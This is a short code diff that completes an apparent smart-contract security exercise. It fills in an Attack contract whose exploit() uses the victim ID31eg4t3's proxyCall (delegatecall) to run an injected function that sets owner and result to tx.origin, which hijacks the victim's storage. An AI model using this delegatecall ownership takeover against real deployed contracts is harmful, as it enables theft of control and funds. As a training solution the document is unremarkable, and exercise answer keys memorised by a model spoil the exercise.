@@ -23,12 +23,16 @@ contract Attack {
     }
 
     // NOTE: You might need some malicious function here
-    
+    function setresultowner() external{
+        result[tx.origin] = true;
+        owner = tx.origin;
+    }
 
     function exploit() external {
         // TODO: Add your implementation here
         // Note: Make sure you know how delegatecall works
-        // bytes memory data = 
-        
+        bytes memory data = abi.encodeWithSignature("setresultowner()");
+        ID31eg4t3(victim).proxyCall(data);
+    
     }
 }
